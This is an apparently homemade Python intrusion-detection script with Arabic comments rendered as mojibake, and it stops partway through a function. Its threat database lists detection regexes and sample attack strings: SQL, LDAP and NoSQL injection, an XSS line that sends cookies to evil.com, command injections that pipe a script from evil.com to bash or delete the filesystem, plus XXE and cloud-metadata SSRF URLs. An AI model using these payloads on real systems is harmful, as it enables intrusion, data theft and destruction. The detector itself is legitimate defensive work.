#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ğŸ§â€â™‚ï¸ Ø£Ø³Ø±Ø§Ø± Ø§Ù„Ù…Ø§Ø±Ø¯ Ø§Ù„Ø±Ù‚Ù…ÙŠ - Ù†Ø¸Ø§Ù… Ø§Ù„Ø£Ù…Ù† Ø§Ù„Ø³ÙŠØ¨Ø±Ø§Ù†ÙŠ Ø§Ù„Ù…ØªÙƒØ§Ù…Ù„
ğŸ” Digital Genie Secrets - Complete Cybersecurity System
âš¡ Professional-Grade Security Suite
"""

import re
import hashlib
import secrets
import time
import json
from datetime import datetime, timedelta
from collections import defaultdict, Counter
import base64
from typing import Dict, List, Tuple, Optional
import ipaddress

class DigitalGenieSecuritySystem:
    """ğŸ§ Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø§Ø±Ø¯ Ø§Ù„Ø±Ù‚Ù…ÙŠ Ø§Ù„Ø´Ø§Ù…Ù„ Ù„Ù„Ø£Ù…Ù† Ø§Ù„Ø³ÙŠØ¨Ø±Ø§Ù†ÙŠ"""
    
    def __init__(self):
        print(self._banner())
        
        # ğŸ¯ Ù‚ÙˆØ§Ø¹Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªÙ‡Ø¯ÙŠØ¯Ø§Øª
        self.threat_intelligence = self._load_threat_intelligence()
        
        # ğŸ“Š ØªØªØ¨Ø¹ Ø§Ù„Ù‡Ø¬Ù…Ø§Øª
        self.attack_logs = []
        self.ip_reputation = defaultdict(lambda: {
            'score': 100,  # 100 = Ù†Ø¸ÙŠÙØŒ 0 = Ø®Ø·Ø± Ø¬Ø¯Ø§Ù‹
            'attacks': [],
            'first_seen': datetime.now(),
            'last_seen': datetime.now(),
            'blocked': False,
            'warnings': 0
        })
        
        # ğŸš« Ø§Ù„Ù‚ÙˆØ§Ø¦Ù… Ø§Ù„Ø³ÙˆØ¯Ø§Ø¡ ÙˆØ§Ù„Ø¨ÙŠØ¶Ø§Ø¡
        self.blacklist = set()
        self.whitelist = set()
        
        # ğŸ” Ù‚ÙˆØ§Ø¹Ø¯ ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ±
        self.leaked_passwords = self._load_leaked_passwords()
        
        # ğŸ“ˆ Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª ÙÙˆØ±ÙŠØ©
        self.stats = {
            'total_requests': 0,
            'blocked_attacks': 0,
            'clean_requests': 0,
            'critical_threats': 0,
            'ips_blocked': 0
        }
        
        # ğŸ“ Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ¹Ù„Ù… Ø§Ù„Ø¢Ù„ÙŠ Ø§Ù„Ø¨Ø³ÙŠØ·
        self.ml_patterns = self._initialize_ml_patterns()
        
    def _banner(self):
        """ğŸ¨ Ø´Ø¹Ø§Ø± Ø§Ù„Ù†Ø¸Ø§Ù…"""
        return """
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                                      â•‘
â•‘     ğŸ§â€â™‚ï¸  Ø£Ø³Ø±Ø§Ø± Ø§Ù„Ù…Ø§Ø±Ø¯ Ø§Ù„Ø±Ù‚Ù…ÙŠ - Ù†Ø¸Ø§Ù… Ø§Ù„Ø­Ù…Ø§ÙŠØ© Ø§Ù„Ø®Ø§Ø±Ù‚  ğŸ§â€â™‚ï¸         â•‘
â•‘                                                                      â•‘
â•‘            ğŸ” Digital Genie Secrets v3.0 ğŸ”                         â•‘
â•‘                                                                      â•‘
â•‘     âš¡ AI-Powered Threat Detection & Prevention System âš¡           â•‘
â•‘                                                                      â•‘
â•‘  ğŸ›¡ï¸  Ø§Ù„Ø­Ù…Ø§ÙŠØ© Ø§Ù„ÙƒØ§Ù…Ù„Ø© Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªÙ‡Ø¯ÙŠØ¯Ø§Øª Ø§Ù„Ø³ÙŠØ¨Ø±Ø§Ù†ÙŠØ©  ğŸ›¡ï¸             â•‘
â•‘                                                                      â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """
    
    def _load_threat_intelligence(self):
        """ğŸ¯ ØªØ­Ù…ÙŠÙ„ Ù‚Ø§Ø¹Ø¯Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªÙ‡Ø¯ÙŠØ¯Ø§Øª Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©"""
        return {
            'SQL_INJECTION': {
                'id': 'ATK-001',
                'name': 'ğŸ’‰ SQL Injection Attack',
                'category': 'Injection',
                'severity': 'CRITICAL',
                'cvss_score': 9.8,
                'patterns': [
                    r"(\bunion\b.*\bselect\b)",
                    r"(\bor\b\s+['\"]?1['\"]?\s*=\s*['\"]?1)",
                    r"(\band\b\s+['\"]?1['\"]?\s*=\s*['\"]?1)",
                    r"(drop\s+table)",
                    r"(insert\s+into)",
                    r"(delete\s+from)",
                    r"(exec(\s|\+)+(s|x)p\w+)",
                    r"([';]\s*--)",
                    r"(/\*.*?\*/)",
                    r"(\bxp_cmdshell\b)",
                    r"(\bor\b.*\blike\b)",
                    r"(\bhaving\b.*\bgroup\s+by\b)",
                    r"(0x[0-9a-f]+)",
                    r"(benchmark\s*\()",
                    r"(sleep\s*\(\s*\d+\s*\))",
                ],
                'description': 'Ù…Ø­Ø§ÙˆÙ„Ø© Ø­Ù‚Ù† Ø£ÙˆØ§Ù…Ø± SQL Ù„Ù„ØªØ­ÙƒÙ… ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª',
                'impact': 'Ø³Ø±Ù‚Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§ØªØŒ ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø³Ø¬Ù„Ø§ØªØŒ Ø­Ø°Ù Ø§Ù„Ø¬Ø¯Ø§ÙˆÙ„ØŒ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ØµÙ„Ø§Ø­ÙŠØ§Øª Ø¥Ø¯Ø§Ø±ÙŠØ©',
                'remediation': 'Ø§Ø³ØªØ®Ø¯Ù… Prepared StatementsØŒ Input ValidationØŒ Least Privilege',
                'references': ['OWASP-A03:2021', 'CWE-89'],
                'attack_vector': 'Network/Adjacent',
                'examples': [
                    "admin' OR '1'='1' --",
                    "1'; DROP TABLE users--",
                    "' UNION SELECT NULL, username, password FROM users--"
                ]
            },
            
            'XSS': {
                'id': 'ATK-002',
                'name': 'âš¡ Cross-Site Scripting',
                'category': 'Injection',
                'severity': 'HIGH',
                'cvss_score': 7.3,
                'patterns': [
                    r"<script[^>]*>.*?</script>",
                    r"javascript\s*:",
                    r"on\w+\s*=",
                    r"<iframe[^>]*>",
                    r"<object[^>]*>",
                    r"<embed[^>]*>",
                    r"<svg[^>]*onload",
                    r"<img[^>]*onerror",
                    r"eval\s*\(",
                    r"expression\s*\(",
                    r"vbscript:",
                    r"<base[^>]*href",
                ],
                'description': 'Ø­Ù‚Ù† ÙƒÙˆØ¯ JavaScript Ø®Ø¨ÙŠØ« ÙŠØ¹Ù…Ù„ ÙÙŠ Ù…ØªØµÙØ­ Ø§Ù„Ø¶Ø­ÙŠØ©',
                'impact': 'Ø³Ø±Ù‚Ø© Ø§Ù„ÙƒÙˆÙƒÙŠØ²ØŒ Session HijackingØŒ PhishingØŒ ØªØ´ÙˆÙŠÙ‡ Ø§Ù„ØµÙØ­Ø§Øª',
                'remediation': 'Output EncodingØŒ Content Security PolicyØŒ HTTPOnly Cookies',
                'references': ['OWASP-A03:2021', 'CWE-79'],
                'attack_vector': 'Network',
                'examples': [
                    "<script>alert(document.cookie)</script>",
                    "<img src=x onerror='fetch(`http://evil.com?c=${document.cookie}`)'>",
                    "javascript:alert('XSS')"
                ]
            },
            
            'COMMAND_INJECTION': {
                'id': 'ATK-003',
                'name': 'ğŸ’» OS Command Injection',
                'category': 'Injection',
                'severity': 'CRITICAL',
                'cvss_score': 9.9,
                'patterns': [
                    r"[;&|]\s*(ls|dir|cat|type|rm|del|mv|cp|wget|curl)",
                    r"`.*?`",
                    r"\$\(.*?\)",
                    r"&&|\|\|",
                    r">\s*/dev/null",
                    r"/etc/passwd",
                    r"/etc/shadow",
                    r"cmd\.exe",
                    r"powershell",
                    r"bash\s+-c",
                    r"sh\s+-c",
                    r"\|\s*nc\s+",
                    r"/bin/(ba)?sh",
                ],
                'description': 'ØªÙ†ÙÙŠØ° Ø£ÙˆØ§Ù…Ø± Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ±ÙØ±',
                'impact': 'Ø§Ù„Ø³ÙŠØ·Ø±Ø© Ø§Ù„ÙƒØ§Ù…Ù„Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ±ÙØ±ØŒ Ø³Ø±Ù‚Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§ØªØŒ ØªÙ†ØµÙŠØ¨ Backdoor',
                'remediation': 'ØªØ¬Ù†Ø¨ shell=TrueØŒ Ø§Ø³ØªØ®Ø¯Ù… WhitelistØŒ Input Validation Ø´Ø¯ÙŠØ¯Ø©',
                'references': ['OWASP-A03:2021', 'CWE-78'],
                'attack_vector': 'Network',
                'examples': [
                    "; cat /etc/passwd",
                    "| whoami",
                    "`rm -rf /`",
                    "$(curl http://evil.com/malware.sh | bash)"
                ]
            },
            
            'PATH_TRAVERSAL': {
                'id': 'ATK-004',
                'name': 'ğŸ“ Path Traversal',
                'category': 'Access Control',
                'severity': 'HIGH',
                'cvss_score': 8.6,
                'patterns': [
                    r"\.\./",
                    r"\.\.\\",
                    r"%2e%2e[/\\]",
                    r"%252e%252e",
                    r"\.\.%2f",
                    r"\.\.%5c",
                    r"/etc/passwd",
                    r"/etc/shadow",
                    r"c:\\windows\\",
                    r"c:/windows/",
                    r"\\windows\\system32",
                    r"\.\.;/",
                    r"%00",  # Null byte injection
                ],
                'description': 'Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù…Ù„ÙØ§Øª Ø®Ø§Ø±Ø¬ Ø§Ù„Ù…Ø¬Ù„Ø¯ Ø§Ù„Ù…ØµØ±Ø­ Ø¨Ù‡',
                'impact': 'Ù‚Ø±Ø§Ø¡Ø© Ù…Ù„ÙØ§Øª Ø­Ø³Ø§Ø³Ø©ØŒ Ø§Ù„ÙˆØµÙˆÙ„ Ù„ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ±ØŒ Ø³Ø±Ù‚Ø© Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª',
                'remediation': 'WhitelistØŒ Path CanonicalizationØŒ chroot jail',
                'references': ['OWASP-A01:2021', 'CWE-22'],
                'attack_vector': 'Network',
                'examples': [
                    "../../../etc/passwd",
                    "....//....//etc/passwd",
                    "..%252f..%252fetc%252fpasswd"
                ]
            },
            
            'XXE': {
                'id': 'ATK-005',
                'name': 'ğŸ“„ XML External Entity',
                'category': 'Injection',
                'severity': 'HIGH',
                'cvss_score': 8.2,
                'patterns': [
                    r"<!ENTITY",
                    r"<!DOCTYPE",
                    r"SYSTEM\s+['\"]file://",
                    r"SYSTEM\s+['\"]http://",
                    r"SYSTEM\s+['\"]ftp://",
                    r"PUBLIC\s+",
                    r"%\w+;",
                    r"&\w+;",
                ],
                'description': 'Ø§Ø³ØªØºÙ„Ø§Ù„ Ù…Ø¹Ø§Ù„Ø¬ XML Ù„Ù‚Ø±Ø§Ø¡Ø© Ù…Ù„ÙØ§Øª Ø£Ùˆ ØªÙ†ÙÙŠØ° Ø·Ù„Ø¨Ø§Øª SSRF',
                'impact': 'Ù‚Ø±Ø§Ø¡Ø© Ù…Ù„ÙØ§Øª Ø§Ù„Ù†Ø¸Ø§Ù…ØŒ SSRFØŒ DOSØŒ Port Scanning',
                'remediation': 'ØªØ¹Ø·ÙŠÙ„ External EntitiesØŒ Ø§Ø³ØªØ®Ø¯Ù… JSON Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† XML',
                'references': ['OWASP-A05:2021', 'CWE-611'],
                'attack_vector': 'Network',
                'examples': [
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                    '<!ENTITY xxe SYSTEM "http://internal.server/secret">'
                ]
            },
            
            'SSRF': {
                'id': 'ATK-006',
                'name': 'ğŸŒ Server-Side Request Forgery',
                'category': 'Security Misconfiguration',
                'severity': 'HIGH',
                'cvss_score': 8.5,
                'patterns': [
                    r"localhost",
                    r"127\.0\.0\.\d+",
                    r"0\.0\.0\.0",
                    r"::1",
                    r"169\.254\.\d+\.\d+",  # AWS metadata
                    r"metadata\.google",
                    r"192\.168\.",
                    r"10\.\d+\.",
                    r"172\.(1[6-9]|2[0-9]|3[0-1])\.",
                    r"file://",
                    r"dict://",
                    r"gopher://",
                    r"ldap://",
                ],
                'description': 'Ø¥Ø¬Ø¨Ø§Ø± Ø§Ù„Ø³ÙŠØ±ÙØ± Ø¹Ù„Ù‰ Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨Ø§Øª Ù„Ø£Ù‡Ø¯Ø§Ù Ø¯Ø§Ø®Ù„ÙŠØ© Ø£Ùˆ Ø®Ø¨ÙŠØ«Ø©',
                'impact': 'Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØ©ØŒ Ø³Ø±Ù‚Ø© AWS KeysØŒ Port Scanning',
                'remediation': 'Whitelist DomainsØŒ Ù…Ù†Ø¹ Private IPsØŒ Disable Redirects',
                'references': ['OWASP-A10:2021', 'CWE-918'],
                'attack_vector': 'Network',
                'examples': [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://localhost:6379",
                    "file:///etc/passwd"
                ]
            },
            
            'LDAP_INJECTION': {
                'id': 'ATK-007',
                'name': 'ğŸ—‚ï¸ LDAP Injection',
                'category': 'Injection',
                'severity': 'HIGH',
                'cvss_score': 7.5,
                'patterns': [
                    r"\*\)\(",
                    r"\)\(\&",
                    r"\)\(\|",
                    r"\*\|",
                    r"admin\*",
                    r"\(\|\(uid=\*\)\)",
                ],
                'description': 'Ø§Ù„ØªÙ„Ø§Ø¹Ø¨ Ø¨Ø§Ø³ØªØ¹Ù„Ø§Ù…Ø§Øª LDAP Ù„ØªØ¬Ø§ÙˆØ² Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©',
                'impact': 'ØªØ¬Ø§ÙˆØ² ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ØŒ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ø¨ÙŠØ§Ù†Ø§Øª Active Directory',
                'remediation': 'Input ValidationØŒ LDAP EscapingØŒ Parameterized Queries',
                'references': ['OWASP-A03:2021', 'CWE-90'],
                'attack_vector': 'Network',
                'examples': [
                    "*)(uid=*))(|(uid=*",
                    "admin*)((|userPassword=*)"
                ]
            },
            
            'CSRF': {
                'id': 'ATK-008',
                'name': 'ğŸ­ Cross-Site Request Forgery',
                'category': 'Broken Access Control',
                'severity': 'MEDIUM',
                'cvss_score': 6.5,
                'patterns': [
                    r"<form[^>]*action\s*=",
                    r"<img[^>]*src\s*=\s*['\"]https?://",
                ],
                'description': 'Ø¥Ø¬Ø¨Ø§Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¹Ù„Ù‰ ØªÙ†ÙÙŠØ° Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª ØºÙŠØ± Ù…Ø±ØºÙˆØ¨Ø©',
                'impact': 'ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±ØŒ ØªØ­ÙˆÙŠÙ„ Ø£Ù…ÙˆØ§Ù„ØŒ ØªØ¹Ø¯ÙŠÙ„ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª',
                'remediation': 'CSRF TokensØŒ SameSite CookiesØŒ Double Submit',
                'references': ['OWASP-A01:2021', 'CWE-352'],
                'attack_vector': 'Network',
                'examples': [
                    '<img src="http://bank.com/transfer?to=attacker&amount=1000">',
                    '<form action="http://site.com/change-email" method="POST">'
                ]
            },
            
            'NOSQL_INJECTION': {
                'id': 'ATK-009',
                'name': 'ğŸ”® NoSQL Injection',
                'category': 'Injection',
                'severity': 'HIGH',
                'cvss_score': 8.1,
                'patterns': [
                    r"\$ne\s*:",
                    r"\$gt\s*:",
                    r"\$lt\s*:",
                    r"\$where\s*:",
                    r"\$regex\s*:",
                    r"{\s*\$",
                    r"true\s*,\s*true",
                ],
                'description': 'Ø­Ù‚Ù† Ø£ÙˆØ§Ù…Ø± ÙÙŠ Ù‚ÙˆØ§Ø¹Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª NoSQL Ù…Ø«Ù„ MongoDB',
                'impact': 'ØªØ¬Ø§ÙˆØ² Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©ØŒ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§ØªØŒ ØªÙ†ÙÙŠØ° ÙƒÙˆØ¯',
                'remediation': 'Input ValidationØŒ Type CheckingØŒ Parameterized Queries',
                'references': ['OWASP-A03:2021', 'CWE-943'],
                'attack_vector': 'Network',
                'examples': [
                    '{"username": {"$ne": null}, "password": {"$ne": null}}',
                    '{"$where": "this.password == \'xxx\' || true"}'
                ]
            },
            
            'FILE_UPLOAD': {
                'id': 'ATK-010',
                'name': 'ğŸ“¤ Malicious File Upload',
                'category': 'Injection',
                'severity': 'CRITICAL',
                'cvss_score': 9.8,
                'patterns': [
                    r"\.php\d?\b",
                    r"\.jsp\b",
                    r"\.asp\b",
                    r"\.aspx\b",
                    r"\.py\b",
                    r"\.pl\b",
                    r"\.cgi\b",
                    r"\.sh\b",
                    r"\.exe\b",
                    r"\.bat\b",
                    r"\.cmd\b",
                    r"<?php",
                    r"<%.*%>",
                ],
                'description': 'Ø±ÙØ¹ Ù…Ù„ÙØ§Øª Ø®Ø¨ÙŠØ«Ø© Ù„ØªÙ†ÙÙŠØ° ÙƒÙˆØ¯ Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ±ÙØ±',
                'impact': 'Remote Code ExecutionØŒ Web ShellØŒ Ø§Ù„Ø³ÙŠØ·Ø±Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ±ÙØ±',
                'remediation': 'Whitelist ExtensionsØŒ Magic Number CheckØŒ Separate Storage',
                'references': ['OWASP-A04:2021', 'CWE-434'],
                'attack_vector': 'Network',
                'examples': [
                    'shell.php',
                    'backdoor.jsp',
                    'image.jpg.php'
                ]
            },
            
            'BRUTE_FORCE': {
                'id': 'ATK-011',
                'name': 'ğŸ”¨ Brute Force Attack',
                'category': 'Authentication',
                'severity': 'MEDIUM',
                'cvss_score': 5.3,
                'patterns': [],  # ÙŠØªÙ… Ø§Ù„ÙƒØ´Ù Ø¹Ù† Ø·Ø±ÙŠÙ‚ Ø§Ù„Ø¹Ø¯
                'description': 'Ù…Ø­Ø§ÙˆÙ„Ø§Øª Ù…ØªÙƒØ±Ø±Ø© Ù„ØªØ®Ù…ÙŠÙ† ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ±',
                'impact': 'Ø§Ø®ØªØ±Ø§Ù‚ Ø§Ù„Ø­Ø³Ø§Ø¨Ø§ØªØŒ DOS',
                'remediation': 'Rate LimitingØŒ Account LockoutØŒ CAPTCHAØŒ 2FA',
                'references': ['OWASP-A07:2021', 'CWE-307'],
                'attack_vector': 'Network',
                'examples': []
            },
            
            'DOS': {
                'id': 'ATK-012',
                'name': 'ğŸ’¥ Denial of Service',
                'category': 'Availability',
                'severity': 'HIGH',
                'cvss_score': 7.5,
                'patterns': [],  # ÙŠØªÙ… Ø§Ù„ÙƒØ´Ù Ø¹Ù† Ø·Ø±ÙŠÙ‚ Ø§Ù„ØªÙƒØ±Ø§Ø±
                'description': 'Ø¥ØºØ±Ø§Ù‚ Ø§Ù„Ø³ÙŠØ±ÙØ± Ø¨Ø·Ù„Ø¨Ø§Øª ÙƒØ«ÙŠØ±Ø©',
                'impact': 'ØªÙˆÙ‚Ù Ø§Ù„Ø®Ø¯Ù…Ø©ØŒ Ø®Ø³Ø§Ø¦Ø± Ù…Ø§Ù„ÙŠØ©ØŒ Ø³Ù…Ø¹Ø© Ø³ÙŠØ¦Ø©',
                'remediation': 'Rate LimitingØŒ CDNØŒ WAFØŒ Load Balancing',
                'references': ['OWASP-A04:2021', 'CWE-400'],
                'attack_vector': 'Network',
                'examples': []
            }
        }
    
    def _load_leaked_passwords(self):
        """ğŸ”‘ Ù‚Ø§Ø¹Ø¯Ø© Ø¨ÙŠØ§Ù†Ø§Øª ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ù…Ø³Ø±Ø¨Ø© Ø§Ù„Ø´Ø§Ø¦Ø¹Ø©"""
        return {
            '123456', 'password', '12345678', 'qwerty', '123456789',
            '12345', '1234', '111111', '1234567', 'dragon',
            '123123', 'baseball', 'iloveyou', 'trustno1', '1234567890',
            'sunshine', 'master', '123321', '666666', 'photoshop',
            '1qaz2wsx', 'qwertyuiop', 'ashley', 'mustang', 'michael',
            'admin', 'root', 'administrator', 'guest', 'test',
            'letmein', 'welcome', 'monkey', 'abc123', 'football',
            'shadow', 'superman', 'batman', 'pass', 'password1'
        }
    
    def _initialize_ml_patterns(self):
        """ğŸ¤– ØªÙ‡ÙŠØ¦Ø© Ø£Ù†Ù…Ø§Ø· Ø§Ù„ØªØ¹Ù„Ù… Ø§Ù„Ø¢Ù„ÙŠ Ø§Ù„Ø¨Ø³ÙŠØ·"""
        return {
            'suspicious_user_agents': [
                'sqlmap', 'nikto', 'nmap', 'scanner', 'crawler', 
                'bot', 'spider', 'scraper', 'hack', 'exploit'
            ],
            'anomaly_scores': defaultdict(list),
            'normal_behavior_baseline': {}
        }
    
    def analyze_request(self, payload: str, ip: str, method: str = 'GET',
                       headers: Dict = None, url: str = '', user_agent: str = '') -> Dict:
        """ğŸ” ØªØ­Ù„ÙŠÙ„ Ø´Ø§Ù…Ù„ Ù„Ù„Ø·Ù„Ø¨"""
        
        self.stats['total_requests'] += 1
        
        print(f"\n{'='*90}")
        print(f"ğŸ¯ Ø§Ù„Ù…Ø§Ø±Ø¯ Ø§Ù„Ø±Ù‚Ù…ÙŠ ÙŠÙØ­Øµ Ø·Ù„Ø¨ Ø¬Ø¯ÙŠØ¯...")
        print(f"{'='*90}")
        print(f"ğŸŒ IP: {ip}")
        print(f"ğŸ”§ Method: {method}")
        print(f"ğŸ“ URL: {url if url else 'N/A'}")
        print(f"ğŸ¤– User-Agent: {user_agent[:50] + '...' if len(user_agent) > 50 else user_agent}")
        print(f"ğŸ“¦ Payload Preview: {payload[:100]}..." if len(payload) > 100 else f"ğŸ“¦ Payload: {payload}")
        print(f"â° Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        # âœ… ÙØ­Øµ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø¨ÙŠØ¶Ø§Ø¡
        if ip in self.whitelist:
            print(f"âœ… IP Ù…ÙˆØ«ÙˆÙ‚ ÙÙŠ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø¨ÙŠØ¶Ø§Ø¡ - ØªÙ… Ø§Ù„Ø³Ù…Ø§Ø­\n{'='*90}")
            self.stats['clean_requests'] += 1
            return {'status': 'WHITELISTED', 'allowed': True}
        
        # ğŸš« ÙØ­Øµ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø³ÙˆØ¯Ø§Ø¡
        if ip in self.blacklist or self.ip_reputation[ip]['blocked']:
            print(f"ğŸš« IP Ù…Ø­Ø¸ÙˆØ±! Ø§Ù„Ø·Ù„Ø¨ Ù…Ø±ÙÙˆØ¶\n{'='*90}")
            self.stats['blocked_attacks'] += 1
            return {'status': 'BLOCKED', 'reason': 'Blacklisted IP', 'allowed': False}
        
        # ğŸ” Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ù…ØªØ¹Ø¯Ø¯ Ø§Ù„Ø·Ø¨Ù‚Ø§Øª
        threats_detected = []
        total_threat_score = 0
        
        # Ø§Ù„Ø·Ø¨Ù‚Ø© 1: ÙØ­Øµ Ø£Ù†Ù…Ø§Ø· Ø§Ù„Ù‡Ø¬Ù…Ø§Øª Ø§Ù„Ù…Ø¹Ø±ÙˆÙØ©
        for threat_id, threat_info in self.threat_intelligence.items():
            if threat_info['patterns']:
                for pattern in threat_info['patterns']:
                    matches = re.findall(pattern, payload, re.IGNORECASE)
                    if matches:
                        threats_detected.append({
                            'threat_id': threat_id,
                            'info': threat_info,
                            'pattern': pattern,
                            'matches': matches[:5],  # Ø£ÙˆÙ„ 5 ØªØ·Ø§Ø¨Ù‚Ø§Øª ÙÙ‚Ø·
                            'confidence': 95
                        })
                        total_threat_score += threat_info['cvss_score'] * 10
                        break
        
        # Ø§Ù„Ø·Ø¨Ù‚Ø© 2: ÙØ­Øµ Ø§Ù„Ø³Ù„ÙˆÙƒ Ø§Ù„Ø´Ø§Ø°
        anomaly_score = self._detect_anomalies(ip, payload, method, user_agent)
        total_threat_score += anomaly_score
        
        # Ø§Ù„Ø·Ø¨Ù‚Ø© 3: ÙØ­Øµ Brute Force
        if self._check_brute_force(ip):
            threats_detected.append({
                'threat_id': 'BRUTE_FORCE',
                'info': self.threat_intelligence['BRUTE_FORCE'],
                'pattern': 'Multiple failed attempts',
                'matches': [f"{len(self.ip_reputation[ip]['attacks'])} attempts"],
                'confidence': 90
            })
            total_threat_score += 50
        
        # Ø§Ù„Ø·Ø¨Ù‚Ø© 4: ÙØ­Øµ DOS/DDOS
        if self._check_dos_pattern(ip):
            threats_detected.append({
                'threat_id': 'DOS',
                'info': self.threat_intelligence['DOS'],
                'pattern': 'High frequency requests',
                'matches': ['DOS pattern detected'],
                'confidence': 85
            })
            total_threat_score += 75
            
        # Ø§Ù„Ø·Ø¨Ù‚Ø© 5: ÙØ­Øµ User Agent Ø§Ù„Ù…Ø´Ø¨ÙˆÙ‡
        if user_agent and self._is_suspicious_user_agent(user_agent):
            print(f"âš ï¸  User-Agent Ù…Ø´Ø¨ÙˆÙ‡ ØªÙ… Ø§ÙƒØªØ´Ø§ÙÙ‡!\n")
            total_threat_score += 30
        
        # Ø§Ù„Ø·Ø¨Ù‚Ø© 6: ÙØ­Øµ IP Geolocation & Reputation
        ip_risk = self._check_ip_reputation(ip)
        total_threat_score += ip_risk
        
        # ØªØ­Ø¯ÙŠØ« Ø³Ø¬Ù„ IP
        self.ip_reputation[ip]['last_seen'] = datetime.now()
        self.ip_reputation[ip]['attacks'].extend([t['threat_id'] for t in threats_detected])
        self.ip_reputation[ip]['score'] = max(0, 100 - total_threat_score / 10)
        
        # ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù‡Ø¬ÙˆÙ…
        if threats_detected:
            self._log_attack(payload, ip, threats_detected, total_threat_score, method, url)
        
        # Ø§ØªØ®Ø§Ø° Ø§Ù„Ù‚Ø±Ø§Ø± ÙˆØ¹Ø±Ø¶ Ø§Ù„Ù†ØªØ§Ø¦Ø¬
        result = self._make_decision(threats_detected, total_threat_score, ip)
        
        return result
    
    def _detect_anomalies(self, ip: str, payload: str, method: str, user_agent: str) -> float:
        """ğŸ¤– ÙƒØ´Ù Ø§Ù„Ø³Ù„ÙˆÙƒ Ø§Ù„Ø´Ø§Ø° Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… ML Ø§Ù„Ø¨Ø³ÙŠØ·"""
        anomaly_score = 0
        
        # 1. Ø·ÙˆÙ„ ØºÙŠØ± Ø¹Ø§Ø¯ÙŠ Ù„Ù„Ù€ Payload
        if len(payload) > 10000:
            anomaly_score += 20
            print(f"âš ï¸  Payload Ø·ÙˆÙŠÙ„ Ø¬Ø¯Ø§Ù‹ ({len(payload)} Ø­Ø±Ù)")
        
        # 2. Ø£Ø­Ø±Ù Ù…Ø´Ø¨ÙˆÙ‡Ø© Ø¨ÙƒØ«Ø§ÙØ© Ø¹Ø§Ù„ÙŠØ©
        suspicious_chars = set('<>\'"`;&|$(){}[]')
        suspicious_count = sum(1 for c in payload if c in suspicious_chars)
        if suspicious_count > len(payload) * 0.1:  # Ø£ÙƒØ«Ø± Ù…Ù† 10%
            anomaly_score += 15
            print(f"âš ï¸  ÙƒØ«Ø§ÙØ© Ø¹Ø§Ù„ÙŠØ© Ù…Ù† Ø§Ù„Ø£Ø­Ø±Ù Ø§Ù„Ù…Ø´Ø¨ÙˆÙ‡Ø©: {suspicious_count}")
        
        # 3. ØªØ´ÙÙŠØ± Ù…ØªØ¹Ø¯Ø¯ Ø§Ù„Ø·Ø¨Ù‚Ø§Øª (Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ØªØ®ÙÙŠ)
